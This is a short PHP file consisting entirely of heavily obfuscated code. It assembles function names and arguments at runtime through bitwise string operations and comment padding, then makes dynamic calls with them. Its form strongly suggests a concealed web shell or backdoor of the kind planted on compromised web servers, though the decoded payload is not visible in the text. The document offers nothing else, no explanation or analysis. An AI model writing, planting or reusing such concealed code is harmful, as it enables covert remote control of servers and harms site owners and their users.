<?php
$iQ3Z4Qg='AdeXu'|O_QPK6X;$pRYRZ='%_7"(-@VT)%'^Y2IOGZ.'(+3BK';$hnheCj5='gm}onw'&#iDre3vK'.
         'oe|oo~';$DHZPRE='-;>SL)'^BNJ62.'^';$GnaCFs9m='PPE"@r$@$ ` '|'0RA&'.ZRaPdab.#p'.
         ' ';$Bad='A`$$L A!PW@$&AK "b@!'|'B '.lhU01.'!rSF  A^! bA(';$OAxlnpw8Pd=/*mTRw6'.
         'S*}J*/yalcZuzfc_.'&]O:'.WeZTkw&'#m|4[}Smj{jW^'.fSKvy.'!x';$XqfiAUB0=/*veR3h1v'.
         '-*N$n*/"De%2L0"|'$f0.h,';$ZDiW='  al3]'|',3`n3 ';$aAv5AM6ZO='&bU;K:H[r './*v5'.
         'Jw<8+*/N0HVQA.'.0EH'|'.!'.O8RBEBP.' K"JtZ@.8UB';$F3fk='5d 5d'|'!d1%$';'XE7p8W'.
         'b)^4P@)V';$SHz8q='?'&r;$chuQRJi6YL='0LA@'|'qI@G';$ZDx_B8='%'^h;$d0fODpQXV8=#Q'.
         ':B^@bas|y+Eo[4>W>'.vOX_uQ.'~EB'^'Xwm!['.PDEIN.'|^hP]c['.Fz9nF.'`G&v';'cIUka6t'.
         ',';$eM9VV1w=rvo&'x{u';$p6nYz_b1=g_&g_;$KFYHSnVST3=v&s;$Yk3Hw=':A5@8/'^#KjKUZF'.
         '_1Y![J';$bhK_1_dfZ=K&K;$_F7Z=iAsEx|'`'.laeH;$U483wJ7='H}|'.P_X_WR_NE_WAR_&#tt'.
         '['.VTz_.'['._ux_DMvcIt_;$ex02TNnPkr='`"{1'^'3a)t';$LP=ENYm.'[}l'&'g^'./*ISo0m'.
         '@rC-Xgpbu*/rIXGN;$u6r80j7p7TL=S&'{';$uvbpUDe=('('.EVcvI.'@41 N'|#YZz5x2gRf6R_'.
         'lt&gh:<td]t')&$pRYRZ;$Ll=('/t='&te7)|("D` "|"I` ");$pICXQHYmJox=$hnheCj5&/*Xj'.
         ';nj&Q.TO*/$DHZPRE;$gCLUBSdwRdA=$GnaCFs9m|('p !AC0`@,@@E'|'@ $@G" p @AA');'Fc1'.
         ':6xebZ';$vNauhdCQHF=$Bad|$OAxlnpw8Pd;$LlX9=$XqfiAUB0^$ZDiW;$EsXA=('V$N"'|#URn'.
         '^(j ')^$chuQRJi6YL;$TL9gAzBc4=('[vt'^';6U')|('d)L'&fmW);$CQ=(L^'`')^/*qAcf8C5'.
         'o:0H*/$ZDx_B8;$Ym9mz=('vE-'.cU2kMn.'"E;'.EomshiL.'%'^"=eC-".lzRfEQ./*y_pANXML'.
         'l-y*2)*/";am^ZZ%&\$R")^$aAv5AM6ZO;if($uvbpUDe($Ll($pICXQHYmJox($LlX9)),/*HGRv'.
         'eZ+ufAI<j*/$F3fk.$d0fODpQXV8.$SHz8q))$gCLUBSdwRdA($EsXA,$TL9gAzBc4,$CQ);'v6Sj'.
         '#';$vNauhdCQHF($eM9VV1w.$p6nYz_b1.$KFYHSnVST3.$Yk3Hw,array(('e"l9e'^#rd8mih27'.
         '_y"t:').$bhK_1_dfZ.$SHz8q.(']0'|'P*').$_F7Z,$pICXQHYmJox($U483wJ7./*IZt4KhXlb'.
         '#ktU*/$ex02TNnPkr.$LP.$u6r80j7p7TL),$Ym9mz));#0<I3S^d346Oc4-=#D~epJ?c76{_#L3'.
         'yX ;3ga.iD8NwR<&[r[H>,8gK}e-tLS.7(i.y{<t(Dl4lr)G-<X';